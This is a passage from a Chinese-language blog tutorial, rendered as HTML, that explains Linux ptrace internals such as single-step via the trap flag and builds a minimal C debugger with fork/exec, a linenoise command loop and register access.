PTRACE 状态</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_PTRACED<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> signr <span class="token operator">!=</span> SIGKILL<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//除了SIGKILL信号，都将让tracee停止并通知tracer</span>            <span class="token comment">/* 让调试器运行  */</span>            current<span class="token operator">-&gt;</span>exit_code <span class="token operator">=</span> signr<span class="token punctuation">;</span>            current<span class="token operator">-&gt;</span>state <span class="token operator">=</span> TASK_STOPPED<span class="token punctuation">;</span>   <span class="token comment">// 让自己进入停止运行状态</span>            <span class="token function">notify_parent</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> SIGCHLD<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 发送 SIGCHLD 信号给父进程表示子进程"死亡(被替换)"</span>            <span class="token function">schedule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 让出CPU的执行权限</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以调试器使用这种方式调试某个程序时大致例程为：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230223/image-20230129132429982.4su930ro2vq0.png" alt="image-20230129132429982"></p><p>当父进程（调试进程）接收到 <code>SIGCHLD</code> 信号后，表示被调试进程已经标记为<strong>被追踪状态并且停止运行</strong>，那么调试进程就可以开始进行调试了。</p><h2 id="PTRACE-SINGLESTEP"><a href="#PTRACE-SINGLESTEP" class="headerlink" title="PTRACE_SINGLESTEP"></a>PTRACE_SINGLESTEP</h2><p>​    单步运行是最为常用的，当把tracee设置为单步运行模式时，tracee每执行一条指令CPU都会停止然后向父进程发送一个<strong>SIGCHLD</strong>信号，在ptrace中实现是将eflags设置trap_flag标志位：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> PTRACE_SINGLESTEP<span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token comment">/* set the trap flag. */</span><span class="token keyword">long</span> tmp<span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token operator">-</span>EIO<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> data <span class="token operator">&gt;</span> _NSIG<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;=</span> <span class="token operator">~</span>PT_TRACESYS<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">&amp;</span> PT_DTRACE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">/* Spurious delayed TF traps may occur */</span>child<span class="token operator">-&gt;</span>ptrace <span class="token operator">|=</span> PT_DTRACE<span class="token punctuation">;</span><span class="token punctuation">}</span>tmp <span class="token operator">=</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">)</span> <span class="token operator">|</span> TRAP_FLAG<span class="token punctuation">;</span><span class="token function">put_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>child<span class="token operator">-&gt;</span>exit_code <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token comment">/* give it a chance to run. */</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    能够这样做是基于X86 intel CPU提供一个硬件机制，就是当eflags的<code>Trap Flag</code>置为1时，CPU每执行一条指令都会产生一个异常然后Linux异常处理机制进程处理，由此会发送一个<strong>SIGTRAP</strong>信号给<strong>tracee</strong>；核心是：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">tmp <span class="token operator">=</span> <span class="token function">get_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">)</span> <span class="token operator">|</span> TRAP_FLAG<span class="token punctuation">;</span><span class="token function">put_stack_long</span><span class="token punctuation">(</span>child<span class="token punctuation">,</span> EFL_OFFSET<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>获取进程的 <code>eflags</code> 寄存器的值，并且设置 <code>Trap Flag</code> 标志。</li><li>把新的值设置到进程的 <code>eflags</code> 寄存器中。</li></ol><p>设置完寄存器后唤醒(wake_up_process)进程，让其进入运行状态：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230223/image-20230129132429982.4su930ro2vq0.png" alt="image-20230129132429982"></p><p>​    同样的当tracee执行完一条指令获取<strong>SIGTRAP</strong>信号，在<strong>do_signal</strong>函数处理信号时，由于<code>current-&gt;ptrace &amp; PT_PTRACED</code>将停止执行并发送<strong>SIGCHLD</strong>信号给父进程tracer。父进程接收到SIGCHLD信号后就知道tracee停止，可以发送命令来读取或者修改tracee的内存数据或寄存器，或者通过调用 <code>ptrace(PTRACE_CONT, child,...)</code> 来让被调试进程进行运行等</p><h1 id="Debugger-基本功能实现"><a href="#Debugger-基本功能实现" class="headerlink" title="Debugger 基本功能实现"></a>Debugger 基本功能实现</h1><p>​    实现一个简单的debugger，大致模型如下：主程序fork一个子程序去执行待调试程序；然后主程序循环等待用户输入命令，停止主程序停止并等待输入命令的条件就是子程序停止，这会在<strong>首次execute一个程序</strong>发生，以及<strong>单步(PTRACE_SINGLESTEP)<strong>或者</strong>断点</strong>发生。子程序很简单只需要调用execute系统调用启动一个新程序即可</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230223/image-20230208214054408.2e6f4s8cndog.png" alt="image-20230208214054408"></p><p>待实现的debugger有三个基本功能：单步，读写寄存器，读写内存。基于这三个功能再添加其他类似于gdb的功能。初始框架如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Expecting program name.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">pid_t</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//child process</span>        <span class="token comment">//execute tracee</span>        <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_TRACEME<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">execl</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//parent process</span>        <span class="token comment">//execute tracer</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"fork."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>子程序部分很简单调用exec族函数即可。</p><h2 id="Parent"><a href="#Parent" class="headerlink" title="Parent"></a>Parent</h2><p>​    首先考虑使用一个结构体记录子进程的信息，然后父进程进入一个读取用户命令的循环，这里使用<a href="https://github.com/antirez/linenoise">linenoise</a>开源项目实现命令补全，命令记录等功能当然还需要处理命令：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * debugger uitls*/</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">Debugger</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>d_name<span class="token punctuation">;</span>    <span class="token keyword">int</span> d_pid<span class="token punctuation">;</span>    Breakpoint <span class="token operator">*</span>d_brks<span class="token punctuation">;</span><span class="token comment">//记录断点</span><span class="token punctuation">}</span>Debugger<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dbg_run</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> wait_status<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">;</span>    <span class="token function">waitpid</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> <span class="token operator">&amp;</span>wait_status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/*UI for start up*/</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>cmd <span class="token operator">=</span> <span class="token function">linenoise</span><span class="token punctuation">(</span><span class="token string">"minidbg$ "</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">dbg_handle_command</span><span class="token punctuation">(</span>dbg<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">linenoiseHistoryAdd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">linenoiseFree</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    使用Debugger结构体记录程序状态，主要是子程序pid和之后的断点信息；<code>linenoise("minidbg$ ")</code>会打印<code>minidbg$ </code>并等待输入，使用<code>dbg_handle_command</code>处理命令包括读写内存，寄存器，下断点等。<code>linenoiseHistoryAdd(cmd)</code>将命令添加到历史记录中</p><p>在<code>dbg_handle_command</code>函数中大致结构为：很方便添加新功能，<strong>is_prefix</strong>辅助函数用于判断缩写指令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">dbg_handle_command</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> <span class="token operator">*</span>lcmd <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> <span class="token operator">*</span>command<span class="token punctuation">;</span>    argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>lcmd<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    command <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>command <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> <span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">/*do_command*/</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Unkown command: %s.\n"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">free</span><span class="token punctuation">(</span>lcmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>bool <span class="token function">is_prefix</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>ss<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>s <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">||</span> ss <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> false<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> ss<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读写寄存器"><a href="#读写寄存器" class="headerlink" title="读写寄存器"></a>读写寄存器</h2><p>​    一个非常基础的功能，基于<code>ptrace(PTRACE_GETREGS, ...)</code>和<code>ptrace(PTRACE_SETREGS, ...)</code>读写寄存器，为了保留寄存器信息在**&lt;sys/user.h&gt;**头文件中定义了如下结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">user_regs_struct</span><span class="token punctuation">{</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r15<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r14<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r13<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r12<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rbp<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rbx<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r11<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r10<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r9<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> r8<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rax<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rcx<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rdx<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rsi<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rdi<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> orig_rax<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rip<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> cs<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> eflags<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> rsp<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ss<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> fs_base<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> gs_base<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ds<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> es<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> fs<span class="token punctuation">;</span>  __extension__ <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> gs<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配合ptrace可以直接按照以上结构体读写寄存器，所以一次读写至少是所有通用寄存器。根据结构体排序定义了如下数据结构体来记录寄存器信息：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*utils.h*/</span><span class="token keyword">enum</span> <span class="token class-name">reg</span><span class="token punctuation">{</span>    en_rax<span class="token punctuation">,</span> en_rbx<span class="token punctuation">,</span> en_rcx<span class="token punctuation">,</span> en_rdx<span class="token punctuation">,</span>    en_rdi<span class="token punctuation">,</span> en_rsi<span class="token punctuation">,</span> en_rbp<span class="token punctuation">,</span> en_rsp<span class="token punctuation">,</span>    en_r8<span class="token punctuation">,</span>  en_r9<span class="token punctuation">,</span>  en_r10<span class="token punctuation">,</span> en_r11<span class="token punctuation">,</span>    en_r12<span class="token punctuation">,</span> en_r13<span class="token punctuation">,</span> en_r14<span class="token punctuation">,</span> en_r15<span class="token punctuation">,</span>    en_rip<span class="token punctuation">,</span> en_rflags<span class="token punctuation">,</span>    en_cs<span class="token punctuation">,</span>    en_orig_rax<span class="token punctuation">,</span> en_fs_base<span class="token punctuation">,</span>    en_gs_base<span class="token punctuation">,</span>    en_fs<span class="token punctuation">,</span> en_gs<span class="token punctuation">,</span> en_ss<span class="token punctuation">,</span> en_ds<span class="token punctuation">,</span> en_es<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">reg_descriptor</span> <span class="token punctuation">{</span>    <span class="token keyword">enum</span> <span class="token class-name">reg</span> r<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">/*utils.c*/</span><span class="token keyword">const</span> <span class="token class-name">size_t</span> n_regs <span class="token operator">=</span> <span class="token number">27</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">reg_descriptor</span> g_register_descriptors<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span> en_r15<span class="token punctuation">,</span> <span class="token string">"r15"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r14<span class="token punctuation">,</span> <span class="token string">"r14"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r13<span class="token punctuation">,</span> <span class="token string">"r13"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r12<span class="token punctuation">,</span> <span class="token string">"r12"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rbp<span class="token punctuation">,</span> <span class="token string">"rbp"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rbx<span class="token punctuation">,</span> <span class="token string">"rbx"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r11<span class="token punctuation">,</span> <span class="token string">"r11"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r10<span class="token punctuation">,</span> <span class="token string">"r10"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r9<span class="token punctuation">,</span> <span class="token string">"r9"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_r8<span class="token punctuation">,</span> <span class="token string">"r8"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rax<span class="token punctuation">,</span> <span class="token string">"rax"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rcx<span class="token punctuation">,</span> <span class="token string">"rcx"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rdx<span class="token punctuation">,</span> <span class="token string">"rdx"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rsi<span class="token punctuation">,</span> <span class="token string">"rsi"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rdi<span class="token punctuation">,</span> <span class="token string">"rdi"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_orig_rax<span class="token punctuation">,</span> <span class="token string">"orig_rax"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rip<span class="token punctuation">,</span> <span class="token string">"rip"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_cs<span class="token punctuation">,</span> <span class="token string">"cs"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rflags<span class="token punctuation">,</span> <span class="token string">"eflags"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_rsp<span class="token punctuation">,</span> <span class="token string">"rsp"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_ss<span class="token punctuation">,</span> <span class="token string">"ss"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_fs_base<span class="token punctuation">,</span> <span class="token string">"fs_base"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_gs_base<span class="token punctuation">,</span> <span class="token string">"gs_base"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_ds<span class="token punctuation">,</span> <span class="token string">"ds"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_es<span class="token punctuation">,</span> <span class="token string">"es"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_fs<span class="token punctuation">,</span> <span class="token string">"fs"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span> en_gs<span class="token punctuation">,</span> <span class="token string">"gs"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为只能一次读写所有寄存器，因此要读写某个寄存器时先用ptrace把所有的读取出来在通过寄存器表查找<strong>g_register_descriptors</strong>，并且因为寄存器表和<code>struct user_regs_struct</code>结构体排序一致可以直接用表中的偏移读写结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">set_register_value</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token keyword">enum</span> <span class="token class-name">reg</span> r<span class="token punctuation">,</span> <span class="token class-name">uint64_t</span> value<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> <span class="token class-name">user_regs_struct</span> regs<span class="token punctuation">;</span>    <span class="token keyword">int</span> reg_descriptor_idx<span class="token punctuation">;</span>    <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_GETREGS<span class="token punctuation">,</span> 